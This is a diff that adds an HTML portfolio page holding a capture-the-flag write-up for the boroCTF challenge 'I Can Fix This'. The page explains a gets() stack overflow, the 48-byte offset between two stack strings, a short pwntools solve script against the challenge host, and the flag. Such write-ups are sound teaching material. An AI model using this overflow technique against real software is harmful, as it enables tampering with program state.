@@ -1,0 +1,174 @@
+<!doctype html>
+<html lang="en" dir="ltr">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>I Can Fix This — boroCTF Writeup — Naim MyLibrary</title>
+  <meta name="description" content="Used an overflow in gets() to overwrite an adjacent stack string so the program’s comparison succeeds without code execution." />
+  <link rel="stylesheet" href="../writeup-template.css" />
+</head>
+<body style="--accent:#ff5294;--accent-2:#c7ff68;">
+  <main class="case-shell">
+    <nav class="case-nav" aria-label="Writeup navigation">
+      <a class="case-brand" href="../index.html">
+        <span class="case-mark">NM</span>
+        <span>Naim MyLibrary</span>
+      </a>
+      <div class="case-links">
+        <a href="../../index.html">Portfolio</a>
+        <a href="../index.html">Library</a>
+        <a href="#walkthrough">Walkthrough</a>
+        <a href="#flag">Flag</a>
+      </div>
+    </nav>
+
+    <header class="case-hero">
+      <section class="case-brief">
+        <p class="eyebrow">boroCTF Pwn casefile</p>
+        <h1>I Can Fix This</h1>
+        <p class="lead">Used an overflow in gets() to overwrite an adjacent stack string so the program’s comparison succeeds without code execution.</p>
+        <div class="meta-row">
+          <span class="chip">CTF: boroCTF</span>
+          <span class="chip">Category: Pwn</span>
+          <span class="chip">Difficulty: Beginner</span>
+          <span class="chip">No points listed</span>
+          <span class="chip">Solves not listed</span>
+          <span class="chip">Tags: Stack Overflow · gets() · State Manipulation</span>
+        </div>
+      </section>
+
+      <aside class="case-panel" aria-label="Writeup status panel">
+        <div class="case-panel-inner">
+          <p class="eyebrow">mission telemetry</p>
+          <div class="status-line"><span>Status</span><strong>Solved</strong></div>
+          <div class="status-line"><span>Method</span><strong>Recon → Analyze → Exploit</strong></div>
+          <div class="status-line"><span>Evidence</span><strong>Commands + reasoning</strong></div>
+          <div class="status-line"><span>Published</span><strong>2026-06-22</strong></div>
+          <div class="progress-track" aria-hidden="true"><span></span></div>
+          <p class="note" style="margin-top:18px;">This writeup is formatted for Naim's portfolio with the original solution flow preserved from the uploaded notes.</p>
+        </div>
+      </aside>
+    </header>
+
+    <div class="case-layout">
+      <aside class="case-toc">
+        <p>Case index</p>
+        <a href="#overview">00 / Overview</a>
+        <a href="#skills">01 / Skills</a>
+        <a href="#timeline">02 / Timeline</a>
+        <a href="#walkthrough">03 / Walkthrough</a>
+        <a href="#evidence">04 / Evidence</a>
+        <a href="#flag">05 / Flag</a>
+        <a href="#lessons">06 / Lessons</a>
+      </aside>
+
+      <article class="case-body">
+        <section class="case-section" id="overview" data-step="00">
+          <p class="eyebrow">operator brief</p>
+          <h2>Overview</h2>
+          <p>Used an overflow in gets() to overwrite an adjacent stack string so the program’s comparison succeeds without code execution.</p>
+          <div class="evidence-grid">
+            <div class="evidence-card"><strong>Challenge</strong><p>I Can Fix This from boroCTF.</p></div>
+            <div class="evidence-card"><strong>Category</strong><p>Pwn Writeups · Beginner difficulty.</p></div>
+          </div>
+          
+        </section>
+
+        <section class="case-section" id="skills" data-step="01">
+          <p class="eyebrow">skills demonstrated</p>
+          <h2>Skills Demonstrated</h2>
+          <div class="skill-grid"><span>pwntools</span><span>Stack Layout</span><span>Buffer Overflow</span><span>Logic Abuse</span></div>
+        </section>
+
+        <section class="case-section" id="timeline" data-step="02">
+          <p class="eyebrow">attack path</p>
+          <h2>Timeline</h2>
+          <div class="timeline"><div><strong>00</strong><p>Review the source and protections.</p></div><div><strong>01</strong><p>Find the unsafe edit function.</p></div><div><strong>02</strong><p>Measure the stack distance between buffers.</p></div><div><strong>03</strong><p>Overwrite constant and trigger check().</p></div></div>
+        </section>
+
+        <section class="case-section" id="walkthrough" data-step="03">
+          <p class="eyebrow">solution notes</p>
+          <h2>Walkthrough</h2>
+          <p>Binary Exploitation (Beginner)</p>
+<h3>Description</h3>
+<p>We were given the source code and a remote service.</p>
+<p>The program allows users to:</p>
+<p>Read two strings.</p>
+<p>Modify one of them.</p>
+<p>Relevant code:</p>
+<p>char non_constant[BUFFSIZE] = &quot;I love&quot;;</p>
+<p>const char constant[BUFFSIZE] = &quot;barackCTF&quot;;</p>
+<p>The goal is to make:</p>
+<p>strcmp(c, &quot;boroCTF&quot;) == 0</p>
+<p>evaluate to true.</p>
+<h3>Vulnerability</h3>
+<p>The function responsible for editing the string is:</p>
+<p>void change(char *nc) {</p>
+<div class="terminal"><div class="terminal-top"><span></span><span></span><span></span></div><pre>printf(&quot;What would like to write?\n&gt; &quot;);</pre></div>
+<p>gets(nc);</p>
+<div class="terminal"><div class="terminal-top"><span></span><span></span><span></span></div><pre>}</pre></div>
+<p>gets() performs no bounds checking, making it vulnerable to a classic stack buffer overflow.</p>
+<h3>Understanding the Stack Layout</h3>
+<p>The binary was protected with:</p>
+<p>Full RELRO</p>
+<p>Canary</p>
+<p>NX</p>
+<p>PIE</p>
+<p>However, we do not need code execution.</p>
+<p>Disassembling main() showed:</p>
+<p>non_constant -&gt; rbp-0x90</p>
+<p>constant     -&gt; rbp-0x60</p>
+<p>Distance:</p>
+<p>0x90 - 0x60 = 0x30 = 48 bytes</p>
+<p>Therefore, writing more than 48 bytes into non_constant will overwrite constant.</p>
+<h3>Exploit</h3>
+<p>Send:</p>
+<p>&quot;A&quot; * 48 + &quot;boroCTF&quot;</p>
+<p>This changes:</p>
+<p>barackCTF</p>
+<p>into:</p>
+<p>boroCTF</p>
+<p>When option 1 is selected:</p>
+<p>check(non_constant, constant);</p>
+<p>the comparison succeeds:</p>
+<p>strcmp(c, &quot;boroCTF&quot;) == 0</p>
+<p>and the flag is printed.</p>
+<h3>Solve Script</h3>
+<div class="terminal"><div class="terminal-top"><span></span><span></span><span></span></div><pre>from pwn import *
+io = remote(&quot;1xgu8bd1niap.boroctf.com&quot;, 34069)
+io.sendlineafter(b&quot;&gt; &quot;, b&quot;2&quot;)
+io.sendlineafter(b&quot;&gt; &quot;, b&quot;A&quot;*48 + b&quot;boroCTF&quot;)
+io.sendlineafter(b&quot;&gt; &quot;, b&quot;1&quot;)
+io.interactive()</pre></div>
+<p>boroCTF{I_c@n_7ix_tH%s}</p>
+<h3>Takeaway</h3>
+<p>Even with modern protections such as PIE, NX, Canary, and Full RELRO, logic flaws and unsafe functions like gets() can still allow attackers to manipulate program state and achieve the challenge goal without needing full code execution.</p>
+        </section>
+
+        <section class="case-section" id="evidence" data-step="04">
+          <p class="eyebrow">proof locker</p>
+          <h2>Evidence</h2>
+          <div class="evidence-grid"><div class="evidence-card"><strong>Clue 01</strong><p>The unsafe gets() call writes into non_constant with no bounds checking.</p></div><div class="evidence-card"><strong>Clue 02</strong><p>Ghidra shows non_constant and constant are 48 bytes apart.</p></div><div class="evidence-card"><strong>Clue 03</strong><p>Overwriting constant with boroCTF satisfies strcmp(c, &quot;boroCTF&quot;).</p></div></div>
+          
+        </section>
+
+        <section class="flag-vault" id="flag">
+          <p class="eyebrow">final artifact</p>
+          <h2>Flag</h2>
+          <code>boroCTF{I_c@n_7ix_tH%s}</code>
+        </section>
+
+        <section class="case-section" id="lessons" data-step="06">
+          <p class="eyebrow">after action report</p>
+          <h2>Lessons Learned</h2>
+          <ul><li>Modern mitigations do not stop all state corruption bugs.</li><li>A stack overflow can solve logic goals without ROP or shellcode.</li><li>Understanding variable layout is often enough for beginner pwn challenges.</li></ul>
+          <div class="footer-actions">
+            <a class="btn" href="../index.html">← Back to MyLibrary</a>
+            <a class="btn ghost" href="../../index.html">Back to Portfolio</a>
+          </div>
+        </section>
+      </article>
+    </div>
+  </main>
+</body>
+</html>
